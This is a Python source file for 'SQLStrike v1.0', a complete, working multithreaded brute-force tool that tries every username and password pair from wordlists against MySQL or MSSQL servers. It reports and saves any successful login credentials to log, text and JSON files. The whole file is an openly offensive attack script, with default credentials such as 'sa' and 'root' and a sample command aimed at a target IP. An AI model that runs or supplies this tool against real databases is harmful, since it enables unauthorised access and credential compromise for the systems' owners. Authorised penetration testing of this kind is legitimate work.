#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import pymysql
import pyodbc

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sqlstrike.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SQLStrike:
    def __init__(self, target: str, port: int, service: str, user_list: str, pass_list: str, 
                 threads: int, timeout: float, database: str = None, quiet: bool = False):
        self.target = target
        self.port = port
        self.service = service.lower()
        self.users = self.load_file(user_list) if user_list else ['admin', 'sa', 'root']
        self.passwords = self.load_file(pass_list) if pass_list else ['password', 'admin123', '']
        self.threads = threads
        self.timeout = timeout
        self.database = database
        self.quiet = quiet
        self.results = []
        self.output_dir = 'sqlstrike-output'
        self.output_file = os.path.join(self.output_dir, 
            f"{self.target}_{self.port}_{self.service}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"{self.target}_{self.port}_{self.service}_{time.strftime('%Y%m%d_%H%M%S')}.json")
        os.makedirs(self.output_dir, exist_ok=True)
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('sqlstrike.log')]

    def load_file(self, file_path: str) -> list:
        """Load usernames or passwords from file."""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error reading file {file_path}: {e}")
            return []

    def test_mysql(self, user: str, password: str) -> dict:
        """Test MySQL credentials."""
        try:
            conn = pymysql.connect(
                host=self.target,
                port=self.port,
                user=user,
                password=password,
                database=self.database if self.database else None,
                connect_timeout=self.timeout
            )
            conn.close()
            return {'status': 'success', 'message': f"MySQL login successful: {user}:{password}"}
        except pymysql.Error as e:
            return {'status': 'failed', 'message': f"MySQL login failed: {str(e)}"}

    def test_mssql(self, user: str, password: str) -> dict:
        """Test MSSQL credentials."""
        try:
            conn_str = (
                f"DRIVER={{ODBC Driver 17 for SQL Server}};"
                f"SERVER={self.target},{self.port};"
                f"DATABASE={self.database if self.database else 'master'};"
                f"UID={user};PWD={password}"
            )
            conn = pyodbc.connect(conn_str, timeout=int(self.timeout))
            conn.close()
            return {'status': 'success', 'message': f"MSSQL login successful: {user}:{password}"}
        except pyodbc.Error as e:
            return {'status': 'failed', 'message': f"MSSQL login failed: {str(e)}"}

    def attempt_login(self, user: str, password: str) -> dict:
        """Attempt login for the specified service."""
        result = {'user': user, 'password': password}
        if self.service == 'mysql':
            result.update(self.test_mysql(user, password))
        elif self.service == 'mssql':
            result.update(self.test_mssql(user, password))
        else:
            result.update({'status': 'error', 'message': f"Unsupported service: {self.service}"})
        
        if result['status'] == 'success':
            self.results.append(result['message'])
            logger.info(result['message'])
        return result

    def run(self) -> None:
        """Run brute-force attack."""
        if self.service not in ['mysql', 'mssql']:
            logger.error(f"Service {self.service} not supported. Choose 'mysql' or 'mssql'.")
            sys.exit(1)

        logger.info(f"Starting SQLStrike on {self.target}:{self.port}, service: {self.service}, "
                   f"threads: {self.threads}")
        json_results = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self.attempt_login, user, password)
                for user in self.users
                for password in self.passwords
            ]
            for future in as_completed(futures):
                json_results.append(future.result())

        # Save text results
        with open(self.output_file, 'a') as f:
            for result in self.results:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Brute-force complete\n")

        # Save JSON results
        with open(self.json_file, 'w') as f:
            json.dump({
                "target": self.target,
                "port": self.port,
                "service": self.service,
                "database": self.database,
                "results": json_results,
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)

        logger.info(f"Brute-force complete. Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(
        description="SQLStrike: A brute-force tool for MySQL and MSSQL databases.",
        epilog="Example: ./sqlstrike.py -t 192.168.1.100 -p 3306 -s mysql -u users.txt -w passwords.txt -T 5"
    )
    parser.add_argument('-t', '--target', required=True, help="Target IP (e.g., 192.168.1.100)")
    parser.add_argument('-p', '--port', type=int, required=True, help="Target port (e.g., 3306)")
    parser.add_argument('-s', '--service', required=True, choices=['mysql', 'mssql'], 
                       help="Service to brute-force (mysql or mssql)")
    parser.add_argument('-u', '--user-list', default='/usr/share/wordlists/users.txt', 
                       help="File with usernames (default: /usr/share/wordlists/users.txt)")
    parser.add_argument('-w', '--pass-list', default='/usr/share/wordlists/passwords.txt', 
                       help="File with passwords (default: /usr/share/wordlists/passwords.txt)")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads (default: 5)")
    parser.add_argument('--timeout', type=float, default=5, 
                       help="Connection timeout in seconds (default: 5)")
    parser.add_argument('-d', '--database', help="Database name (optional)")
    parser.add_argument('-q', '--quiet', action='store_true', help="Quiet mode (log to file only)")

    args = parser.parse_args()

    # Validate wordlist files
    for file_path in [args.user_list, args.pass_list]:
        if not os.path.isfile(file_path):
            logger.error(f"Wordlist file not found: {file_path}")
            sys.exit(1)

    print("""
    ==============================
         SQLStrike v1.0
      Brute-Forcing SQL Servers
    ==============================
    """)

    try:
        striker = SQLStrike(
            target=args.target,
            port=args.port,
            service=args.service,
            user_list=args.user_list,
            pass_list=args.pass_list,
            threads=args.threads,
            timeout=args.timeout,
            database=args.database,
            quiet=args.quiet
        )
        striker.run()
    except KeyboardInterrupt:
        logger.info("Brute-force interrupted by user")
        sys.exit(0)

if __name__ == "__main__":
    main()